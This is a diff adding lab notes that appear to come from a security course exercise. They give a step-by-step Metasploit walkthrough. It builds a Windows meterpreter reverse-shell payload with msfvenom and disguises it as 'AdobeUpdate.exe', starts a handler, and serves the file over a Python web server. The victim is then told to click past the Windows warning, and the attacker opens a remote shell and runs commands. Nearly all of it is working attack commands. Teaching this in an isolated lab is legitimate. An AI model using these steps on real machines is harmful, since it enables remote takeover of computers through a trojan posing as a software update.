@@ -1,0 +1,69 @@
+
+A.
+
+PLAY ATTACKER
+
+1. msfvenom --list formats ( to see a list of output formats that msfvenom supports.)
+
+2. msfvenom -p windows/meterpreter/reverse_tcp LHOST=virbr1 -f exe > /tmp/AdobeUpdate.exe < virbr1 = ipaddress >
+ 
+ -p :– selects the payload to be the same one we used during the exploitation lab – meterpreter.
+ -f exe :– selects the file type of the output executable
+ LHOST=virbr1 :– sets LHOST to be the name of the adapter on which Kali has its 192.168.56.0/24 address. msfconsole should translate it for us.
+> /tmp/AdobeUpdate.exe :– redirects the output from running the msfvenom command into a file called AdobeUpdate.exe, stored in the /tmp directory.
+
+
+3. Verify that the output file is about 73802 bytes in size.
+
+4. Run an msf handler to listen for the meterpreter reverse connection which will be incoming when our malicious AdobeUpdate.exe payload file is    executed.
+
+ On Kali, open a new terminal window and enter   msfconsole.
+ Enter   use exploit/multi/handler.
+
+ Enter  set PAYLOAD windows/meterpreter/reverse_tcp.
+ Enter  set LHOST virbr1.
+ Enter  exploit -j. < The -j option jobifies the exploit, or runs it as a job in the background. >
+
+
+5. Now, we need to set up a way to deliver the payload to the victim. Set up a web server to host your malicious file.
+
+ Change directories to   < /tmp by entering cd /tmp in a kali terminal. >
+ Check that the payload you generated earlier is in this directory:  < run ls >
+ Now, from that directory, run the following command to use an http webserver built into python to serve content from the current directory (/tmp) on  an arbitrary port - 8888:   < python3 -m http.server 8888 >
+
+
+
+PLAY VICTIM
+
+ http://< ip address >:8888.
+ Click AdobeUpdate.exe to download it. Click it to execute it.
+ click “More info” and then “Run anyway.”
+
+
+PLAY ATTACKER AGAIN
+
+ Command shell session X opened,” where X is the number of the new session.
+
+ sessions -i [the number of the new session] :-  This should open a connection to a meterpreter on the Windows VM.
+
+
+Run < shell > to drop down into a windows cmd prompt
+	Type < whoami > to see the privileges that you are running under. Note that these are the privileges of the user of your Windows VM.
+	Run the command < netstat -n > to see a listing of open connections on the Windows server. Note the “ESTABLISHED” connection from the Windows VM to your Kali VM.
+	Return to your meterpreter shell by running < exit > to leave the cmd prompt.
+
+
+
+COMMANDS
+
+pgrep AdobeUpdate
+getpid
+shell
+echo "your first and last name"
+date /t
+
+
+
+
+
+
